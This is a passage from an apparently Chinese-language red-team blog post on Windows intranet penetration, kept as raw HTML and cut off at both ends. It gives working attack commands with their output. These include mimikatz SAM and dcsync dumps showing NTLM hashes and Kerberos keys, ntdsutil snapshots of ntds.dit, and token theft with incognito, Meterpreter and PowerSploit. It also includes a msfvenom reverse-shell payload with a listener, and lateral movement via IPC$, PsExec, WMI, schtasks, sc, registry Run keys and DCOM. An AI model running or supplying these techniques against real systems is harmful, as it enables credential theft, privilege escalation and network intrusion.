class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># token::elevate</span></span><br><span class="line">Token Id  : <span class="number">0</span></span><br><span class="line">User name :</span><br><span class="line">SID name  : NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line"><span class="number">868</span>     &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">87942</span>          NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Primary</span><br><span class="line"> -&gt; Impersonated !</span><br><span class="line"> * <span class="keyword">Process</span> Token : &#123;<span class="number">0</span>;<span class="number">04</span>c06ab9&#125; <span class="number">2</span> F <span class="number">589748425</span>   DESKTOP<span class="literal">-S5P5JJD</span>\ascotbe S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span><span class="literal">-1001</span> (<span class="number">17</span>g,<span class="number">24</span>p)        Primary</span><br><span class="line"> * Thread Token  : &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">590261325</span>   NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Impersonation (Delegation)</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br><span class="line">Domain : DESKTOP<span class="literal">-S5P5JJD</span></span><br><span class="line">SysKey : <span class="number">162</span>ff22be845ceffcb86ad9fc6f5b8fa</span><br><span class="line">Local SID : S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span></span><br><span class="line"></span><br><span class="line">SAMKey : c0776d417550ffc4c869dd75f05c783c</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: ea5440b2fca105cdf6759f22e7c287d6</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">41</span>ccbf610919ce0103bd5f9f03349bf6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">01</span>c68f20c20b145a433f03a4b8922e9da06a8452f94d18a51e839b2d72d7c8e7</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>b87d173421e72aec02ba1e0e1b043c8</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>e9 (<span class="number">1001</span>)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: <span class="number">3</span>dbde697d71690a769204beb12283678</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">1</span>f3b3c572b6a2f91204b073d6f148738</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>ea (<span class="number">1002</span>)</span><br><span class="line">User : asc0t6e</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">5791</span>ed4fcb24d37bb6d45e422d0564b6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : fca1c2a6324d2824dfb41aa111c7225eb054028a1943c4a2f88b33e5c1d6d724</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">707804346421</span>c4c8834250d85b3a0d80</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>eb (<span class="number">1003</span>)</span><br><span class="line">User : www2</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : acc5ca5339811d2f4cf44f8427ff9333</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">37425</span>bb81e1ceb50cff95dfb985c60aeb3a44941b1c186cf6a2ecb66cb87a49d</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : b6ae15c330aa7db1b0f4b53575516c1e</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">622</span>f8686a8fecbc8</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">622</span>f8686a8fecbc8</span><br></pre></td></tr></table></figure>

<h3 id="域Hash"><a href="#域Hash" class="headerlink" title="域Hash"></a>域Hash</h3><h4 id="NTDSUTIL"><a href="#NTDSUTIL" class="headerlink" title="NTDSUTIL"></a>NTDSUTIL</h4><p>该NTDSUTIL是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理<code>Windows Active Directory</code>数据库。但是，渗透测试人员和redteam可以用它来拍摄现有ntds.dit文件的快照，该文件可以复制到新位置以进行离线分析和密码哈希的提取。</p>
<blockquote>
<p>PS：只有在域服务器上才有这个程序</p>
</blockquote>
<p>执行这个命令就可以拍摄快照了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/59.png?raw=true" alt="image-20200803213243474"></p>
<p>然后在<code>C:\ntdsutil</code>位置就能看到拍摄的快照了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/60.png?raw=true" alt="image-20200803213325057"></p>
<p>然后可以使用<strong>NTDSDumpEx</strong>进行解密，项目地址如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;NTDSDumpEx</span><br></pre></td></tr></table></figure>

<p>如果你只是使用管理员权限运行的话可以执行如下命令来获取hash，<code>-d</code>表示该文件的路径，<code>-k</code>表示获取的SYSTEM的key</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -r</span><br><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -k HEX-SYS-KEY</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/61.png?raw=true" alt="image-20200803214714406"></p>
<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值。这样子解决了需要直接使用域控制器进行身份验证的需要，因为它可以从域管理员的上下文中获得执行权限。因此它是红队的基本操作，因为它不那么复杂。</p>
<p>提取域中所有用户HASH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/62.png?raw=true" alt="image-20200803215925120"></p>
<p>如果要获取指定的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:admin</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/63.png?raw=true" alt="image-20200803220106374"></p>
<h4 id="AccessToken窃取"><a href="#AccessToken窃取" class="headerlink" title="AccessToken窃取"></a>AccessToken窃取</h4><blockquote>
<p>令牌(Token)</p>
</blockquote>
<p><strong>令牌(token)是系统的临时秘钥，相当于账号和密码</strong>，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，<strong>访问网络和系统资源</strong>，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p>
<p><strong>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</strong></p>
<p><strong>令牌有很多种：</strong></p>
<ul>
<li>访问令牌(Access Token)：表示访问控制操作主体的系统对象</li>
<li>会话令牌(Session Token)：是交互会话中唯一的身份标识符</li>
<li>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</li>
</ul>
<p><strong>Windows的AccessToken有两种类型：</strong></p>
<ul>
<li><strong>Delegation Token：授权令牌，它支持交互式会话登录</strong> (例如本地用户直接登录、远程桌面登录访问)</li>
<li><strong>Impresonation Token：模拟令牌，它是非交互的会话</strong> (例如使用net use访问共享文件夹)。</li>
</ul>
<p><strong>注：</strong> 两种token只在系统重启后清除 具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
<p>目前有三种利用方式incognito.exe程序 、InvokeTokenManipulat.ps1脚本 、MSF里的incognito模块</p>
<h5 id="程序incognito"><a href="#程序incognito" class="headerlink" title="程序incognito"></a>程序incognito</h5><p>下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.mwrinfosecurity.com&#x2F;assets&#x2F;BlogFiles&#x2F;incognito2.zip</span><br></pre></td></tr></table></figure>

<p><strong>AccessToken的列举</strong>(需要administrator权限)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/64.png?raw=true" alt="image-20200803221305645"></p>
<p>可以看到Token都列举出来了，我们只需要复制token然后即可提权，也可以进行降权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提权至system</span></span><br><span class="line">.\incognito.exe execute -c <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/65.png?raw=true" alt="image-20200803221740843"></p>
<h5 id="MSF下的incognito模块"><a href="#MSF下的incognito模块" class="headerlink" title="MSF下的incognito模块"></a>MSF下的incognito模块</h5><p>首先生成进程让我们的kali连接到域控中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.183.138  LPORT=6666 -e x86/shikata_ga_nai -i 5 -b <span class="string">&quot;\x00&quot;</span> -f exe &gt;test.exe</span><br></pre></td></tr></table></figure>

<p>然后监听进程连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.183.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>连接上后就可以直接提权了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito <span class="comment">#加载incognito</span></span><br><span class="line">list_tokens -u <span class="comment">#列出AccessToken</span></span><br><span class="line">getuid    <span class="comment">#查看当前token</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="comment">#模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可</span></span><br><span class="line">steal_token 1252 <span class="comment">#从进程窃取token</span></span><br><span class="line">getsystem <span class="comment">#提升至system权限</span></span><br><span class="line">rev2self <span class="comment">#返回到之前的AccessToken权限</span></span><br></pre></td></tr></table></figure>

<h5 id="Invoke-TokenManipulation-ps1脚本"><a href="#Invoke-TokenManipulation-ps1脚本" class="headerlink" title="Invoke-TokenManipulation.ps1脚本"></a>Invoke-TokenManipulation.ps1脚本</h5><p>下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-TokenManipulation.ps1</span><br></pre></td></tr></table></figure>

<p>使用命令如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入脚本</span></span><br><span class="line">Import-Module .\Invoke-TokenManipulation.ps1</span><br><span class="line"><span class="comment">#列举token</span></span><br><span class="line">Invoke-TokenManipulation -Enumerate</span><br><span class="line"><span class="comment">#提权至system</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -Username <span class="string">&quot;nt authoritysystem&quot;</span></span><br><span class="line"><span class="comment">#复制(窃取)进程token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ProcessId 500</span><br><span class="line"><span class="comment">#复制(窃取)线程token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ThreadId 500</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/66.png?raw=true" alt="image-20200803225323734"></p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/67.png?raw=true" alt="image-20200803225536976"></p>
<h5 id="利用token获得TrustedInstaller权限"><a href="#利用token获得TrustedInstaller权限" class="headerlink" title="利用token获得TrustedInstaller权限"></a>利用token获得TrustedInstaller权限</h5><p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件</p>
<p>因为Windows系统的最高权限为<strong>TrustedInstaller</strong></p>
<p>可以看到我们拥有<strong>SYSTEM</strong>权限也无法在目录<code>C:\Windows\servicing</code>下写入文件</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/68.png?raw=true" alt="image-20200803225848113"></p>
<p>但是<strong>TrustedInstaller.exe</strong>是有这个权限的，可以通过<code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</code>来查看</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/69.png?raw=true" alt="image-20200803231351000"></p>
<p>我们可以使用<code>sc.exe start TrustedInstaller</code>来启动这个服务，然后找到这个进程，通过窃取这个进程的Token来提升权限</p>
<p>可以看到下图虽然我们还是system的权限，但是我们已经可以在<code>C:\Windows\servicing</code>目录下面写入文件了，同理MSF中的incognito模块也能成功</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/70.png?raw=true" alt="image-20200803231243500"></p>
<h3 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h3><p>弱口令，永远改不完。在内网中，也可以尝试对smb、3389、mssql弱口令进行密码暴力破解，但是要注意线程，密码数不要太多。当然，也可以使用不同账号，同个密码进行尝试。这里使用kerbrute对域用户/密码进行暴力破解</p>
<p>项目地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;kerbrute</span><br></pre></td></tr></table></figure>

<p>这项目需要使用字典来枚举用户或者枚举密码，这里就懒得演示了</p>
<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>留个坑，这个还不是很明白</p>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>全程使用windows 10 连接我们的域控 windows 2008 </p>
<ul>
<li>域控IP： <strong>192.168.183.143</strong></li>
<li>用户名：<strong>administrator</strong></li>
<li>密码：<strong>XXXXXX</strong></li>
</ul>
<h3 id="账号密码链接"><a href="#账号密码链接" class="headerlink" title="账号密码链接"></a>账号密码链接</h3><p>当我们获取到机器的账号密码的时候，可以尝试用以下几种方式进行连接并执行命令。</p>
<h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>利用条件：</p>
<ul>
<li><strong>139</strong> or <strong>445</strong>端口开启</li>
<li>管理员开启默认共享</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\1.1.1.1\ipc$  &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/71.png?raw=true" alt="image-20200805211744299"></p>
<p>建立好连接后可以把对方的C盘映射到自己的Z盘中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.183.143\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/72.png?raw=true" alt="image-20200805211845297"></p>
<p>还能执行木马文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#建立好IPC后，把shell.exe复制到目标机器上(这里的$是指admin用户的c:\winnt\system32\)</span><br><span class="line">copy shell.exe \\1.1.1.1\admin$</span><br><span class="line">#然后查看目标机器的时间</span><br><span class="line">net time \\127.0.0.1</span><br><span class="line">#用at命令让目标机器12点执行shell.exe文件</span><br><span class="line">at \1.1.1.1 12:00 shell.exe</span><br></pre></td></tr></table></figure>



<h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>直接去微软官网下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;sysinternals&#x2F;downloads&#x2F;psexec</span><br></pre></td></tr></table></figure>

<p>下载好把文件提取出来就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用服务启动的方式：</span><br><span class="line">.\PsExec.exe  \\1.1.1.1 -accepteula -u username -p  password cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/73.png?raw=true" alt="image-20200805212914831"></p>
<h4 id="WMI-amp-WINRM"><a href="#WMI-amp-WINRM" class="headerlink" title="WMI&amp;WINRM"></a>WMI&amp;WINRM</h4><p><strong>方法一</strong></p>
<p>创建记事本进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic  /user:<span class="string">&quot;ascotbe.com\administrator&quot;</span>  /password:<span class="string">&quot;password&quot;</span>  /node:1.1.1.1 process call create <span class="string">&quot;notepad&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/74.png?raw=true" alt="image-20200805213359196"></p>
<p>然后看域控中的进程</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/75.png?raw=true" alt="image-20200805213420618"></p>
<p><strong>方法二</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WmiMethod  -class win32_process -name create -argumentlist <span class="string">&#x27;notepad&#x27;</span> -ComputerName  1.1.1.1 -Credential <span class="string">&#x27;ascotbe.com\administrator&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>方法三</strong></p>
<p>直接用360灵腾实验室的工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/360-Linton-Lab/WMIHACKER</span><br></pre></td></tr></table></figure>

<p>有回显查看whoami</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/76.png?raw=true" alt="image-20200805220346919"></p>
<p>还有文件下载、上传、模拟shell等模式</p>
<h4 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h4><p>定时任务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru <span class="string">&quot;SYSTEM&quot;</span>  /tn <span class="string">&quot;windowsupdate&quot;</span> /sc DAILY  /tr <span class="string">&quot;calc&quot;</span> /F</span><br><span class="line">schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/77.png?raw=true" alt="image-20200805220733211"></p>
<p>然后查看我们域控，可以发现后台启动了计算器并且是SYSTEM权限</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/78.png?raw=true" alt="image-20200805220811976"></p>
<h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><p>这个就是计划任务上面IPC的时候讲了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at  \\1.1.1.1 15:15 calc</span><br></pre></td></tr></table></figure>

<h4 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h4><p>这个和上面的计划任务类似，启动计算器进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc  \\1.1.1.1 create windowsupdate binpath= <span class="string">&quot;calc&quot;</span></span><br><span class="line">sc  \\1.1.1.1 start windowsupdate</span><br></pre></td></tr></table></figure>

<h4 id="REG"><a href="#REG" class="headerlink" title="REG"></a>REG</h4><p>利用注册列表来添加计算器进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  \\1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t  REG_SZ /d <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="variable">$com</span>  = [activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;1.1.1.1&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span><br><span class="line"><span class="comment">#  方法二</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span 